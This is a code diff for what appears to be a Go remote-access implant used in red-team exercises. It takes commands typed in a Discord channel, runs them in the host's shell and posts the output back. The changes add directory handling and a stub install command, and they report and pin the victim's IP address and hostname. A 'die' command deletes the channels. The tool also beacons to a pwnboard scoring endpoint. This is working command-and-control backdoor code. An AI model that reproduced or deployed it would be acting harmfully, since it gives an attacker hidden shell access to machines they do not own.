@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"net/http"
 	"bytes"
+	"strings"
 	"time"
 	"encoding/json"
 	"gopkg.in/yaml.v3"
@@ -16,7 +17,7 @@ import (
 	creator "./discord"
 )
 
-var categoryid int
+var categoryid disgord.Snowflake
 
 //Config is used to represent the config file
 type Config struct {
@@ -49,8 +50,10 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 		}else if msg.Content == "die"{
 			// Delete Channel
 			s.DeleteChannel(context.Background(), msg.ChannelID)
-			s.DeleteChannel(context.Background(), disgord.Snowflake(categoryid))
+			s.DeleteChannel(context.Background(), categoryid) // <-------------------Remove after testing
 			os.Exit(0)
+		}else if msg.Content == "install" {
+			//Install stuff based on OS
 		}else{
 			fmt.Println("Input: ", msg.Content)
 
@@ -59,8 +62,7 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 			if output == ""{
 				msg.Reply(context.Background(), s, "Command didn't return anything")
 			}else{
-				prettyOutput := "```" + output + "```"
-				msg.Reply(context.Background(), s, prettyOutput)
+				msg.Reply(context.Background(), s, prettyOutput(output))
 			}
 		}
 	}else{
@@ -68,8 +70,17 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 	}
 }
 
-//TODO: Still have some error
+//TODO: Large output
 func shellRun(cmd string) string{
+	// special cd
+	splittedCommand := strings.Fields(string(cmd))
+	args := splittedCommand[1:]
+	fmt.Println("args ", args)
+	if splittedCommand[0] == "cd" {
+		os.Chdir(strings.Join(args, ""))
+		return "Changed directory Successfully"
+	}
+
 	var shell, flag string
 	if runtime.GOOS == "windows"{
 		shell = "cmd"
@@ -81,7 +92,7 @@ func shellRun(cmd string) string{
 
 	out, err := exec.Command(shell, flag, cmd).Output()
 	if err != nil {
-		panic(err)
+		return "Invalid command"
 	}
 
 	return string(out)
@@ -90,7 +101,7 @@ func shellRun(cmd string) string{
 func updatepwnBoard(ip string){
 	for {
 
-		time.Sleep(2 * time.Second)
+		time.Sleep(7 * time.Second)
 
 		// url := "http://pwnboard.win/generic"
 		url := "http://localhost:8080"
@@ -135,6 +146,19 @@ func getIP() string {
 	return ""
 }
 
+func systeminfo(s disgord.Session, evt *disgord.MessageCreate){
+	//hostname and ip
+	ip := getIP()
+	
+	s.SendMsg(context.Background(), evt.Message.ChannelID, ip)
+	return
+}
+
+func prettyOutput(str string) string {
+	return "```" + str + "```"
+}
+
+
 func main(){
 	// Config file
 	f, err := os.Open("config.yaml")
@@ -169,15 +193,23 @@ func main(){
 
 	//create catogory
 	category := creator.CreateCategory(client, id, categoryName)
-	categoryid = categoryid
+	categoryid = category.ID
 
 	//general channel
 	// creator.CreateChannel(client, id,  category, "general")
 
 	//create channel
-	creator.CreateChannel(client, id,  category, channelName)
+	subchan := creator.CreateChannel(client, id,  category, channelName)
 	channels := &guild.Channels
 	fmt.Println(channels)
+
+	// sending ip and pinning
+	ipmessage, _ := client.SendMsg(context.Background(), subchan.ID, prettyOutput("IP: " + getIP()))
+	client.PinMessage(context.Background(), ipmessage)
+	//sending hostname and pinning
+	hostname , _ := os.Hostname()
+	hostnamemsg, _ := client.SendMsg(context.Background(), subchan.ID, prettyOutput("Hostname: " + hostname))
+	client.PinMessage(context.Background(), hostnamemsg)
 
 	client.On(disgord.EvtMessageCreate, userInput)
 }
